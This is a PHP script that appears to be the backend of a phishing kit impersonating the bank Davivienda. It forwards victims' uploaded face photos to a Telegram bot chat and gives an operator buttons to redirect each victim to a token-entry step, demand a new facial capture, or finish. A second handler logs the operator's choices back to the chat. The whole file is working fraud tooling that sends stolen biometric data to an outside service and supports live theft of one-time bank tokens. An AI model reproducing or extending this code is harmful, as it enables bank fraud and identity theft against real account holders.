<?php
header('Content-Type: application/json');
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $config = require __DIR__ . '/../config.php';
    
    $botToken = $config['bot_token'] ?? '';
    $chatId = $config['chat_id'] ?? '';

    if (!$botToken || !$chatId) {
        throw new Exception('Faltan credenciales del bot');
    }

    // 1. ENVIAR FOTO CON BOTONES (INTENTO ÚNICO)
    if (isset($_FILES['photo']) && isset($_POST['transactionId'])) {
        $photo = $_FILES['photo'];
        $caption = $_POST['caption'] ?? '📸 Verificación facial - DAVIVIENDA';
        $transactionId = $_POST['transactionId'];
        
        if ($photo['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('Error al subir la foto: ' . $photo['error']);
        }
        
        // PREPARAR BOTONES
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => "📱 Redirigir a Token", 'callback_data' => "pedir_dinamica:" . $transactionId],
                    ['text' => "🔄 Error Facial", 'callback_data' => "facial:" . $transactionId]
                ],
                [
                    ['text' => "✅ Finalizar", 'callback_data' => "confirm_finalizar:" . $transactionId]
                ]
            ]
        ];
        
        // Enviar foto con botones
        $data = [
            'chat_id' => $chatId,
            'caption' => $caption . "\n\n🆔 ID: " . $transactionId,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        
        $data['photo'] = new CURLFile($photo['tmp_name'], $photo['type'], $photo['name']);
        
        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            throw new Exception('CURL Error: ' . $error);
        }
        
        $result = json_decode($response, true);
        
        if (!$result['ok']) {
            throw new Exception('Telegram Error: ' . json_encode($result));
        }
        
        echo json_encode([
            'status' => 'success',
            'messageId' => $result['result']['message_id']
        ]);
        exit;
    }

    // 2. ENVIAR MENSAJE CON ACCIÓN DEL ADMIN (NUEVO MENSAJE)
    if (isset($_POST['adminAction']) && $_POST['adminAction'] === 'true') {
        $action = $_POST['action'];
        $adminName = $_POST['adminName'];
        $transactionId = $_POST['transactionId'];
        
        // Primero responder al callback query (si viene)
        if (isset($_POST['callbackId'])) {
            $callbackData = [
                'callback_query_id' => $_POST['callbackId']
            ];
            
            $ch = curl_init("https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($callbackData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            
            curl_exec($ch);
            curl_close($ch);
        }
        
        // Determinar texto de la acción
        $actionText = '';
        $actionEmoji = '';
        
        switch ($action) {
            case 'pedir_dinamica':
                $actionText = 'Redirigido a Token';
                $actionEmoji = '📱';
                break;
            case 'facial':
                $actionText = 'Error Facial - Reenviado a verificación';
                $actionEmoji = '🔄';
                break;
            case 'confirm_finalizar':
                $actionText = 'Verificación Finalizada';
                $actionEmoji = '✅';
                break;
            default:
                $actionText = $action;
                $actionEmoji = '📋';
        }
        
        $message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" .
                  "{$actionEmoji} <b>ACCIÓN:</b> {$actionText}\n" .
                  "👨‍💼 <b>Operador:</b> {$adminName}\n" . 
                  "━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
        
        $messageData = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($messageData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $result = json_decode($response, true);
        
        echo json_encode([
            'status' => $result['ok'] ? 'success' : 'error',
            'result' => $result
        ]);
        exit;
    }

    throw new Exception('Solicitud no válida');

} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
}